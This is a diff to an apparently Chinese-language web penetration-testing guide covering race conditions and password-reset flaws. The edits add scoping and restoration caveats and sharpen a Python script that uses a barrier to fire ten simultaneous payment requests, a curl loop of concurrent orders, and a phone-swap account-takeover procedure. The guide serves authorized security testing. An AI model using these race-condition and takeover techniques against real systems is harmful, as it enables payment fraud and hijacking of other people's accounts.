@@ -124,6 +124,8 @@ for code in range(0, 10000):
 
 ## 三、竞争条件（Race Condition）
 
+受控对象、初态/最终状态、无副作用预热、同步释放和幂等排除统一见 `race-condition-test.md` 第三、四节。先小批次对照，成功回包数不等于成功交易数；串行对照不能先耗尽并发批次的一次性资源。
+
 ### 3.1 并发扣减
 
 ```python
@@ -131,10 +133,12 @@ import threading
 import requests
 
 # 余额 100，同时发起 10 次 100 元消费
+gate = threading.Barrier(10)
 def consume():
+    gate.wait(timeout=10)
     r = requests.post("https://target.com/api/pay",
         headers={"Authorization": f"Bearer {TOKEN}"},
-        json={"amount": 100})
+        json={"amount": 100}, timeout=10, allow_redirects=False)
     print(r.json())
 
 threads = [threading.Thread(target=consume) for _ in range(10)]
@@ -151,6 +155,7 @@ for i in $(seq 1 10); do
     -H "Authorization: Bearer $TOKEN" \
     -d '{"orderId": "ORDER123", "amount": "0.01"}' &
 done
+wait
 ```
 
 ---
@@ -172,10 +177,11 @@ curl "https://target.com/api/register/check?phone=13800138000"
 
 ```
 测试流程:
-1. 发起找回密码（手机 A）
+0. 按 dig-scope §4.2.2 确认 A/B 均为受控测试账号，已记录原状态且恢复路径可用
+1. 发起找回密码（受控手机 A）
 2. 获取到 token/链接
-3. 修改请求中的 phone 为手机 B
-4. 如果成功修改 B 的密码 → 任意账号密码重置
+3. 修改请求中的 phone 为受控手机 B
+4. 独立核验 B 的密码确实被越权修改后恢复并核验；只回成功不算，缺恢复条件不发写请求
 ```
 
 ### 4.3 接管漏洞
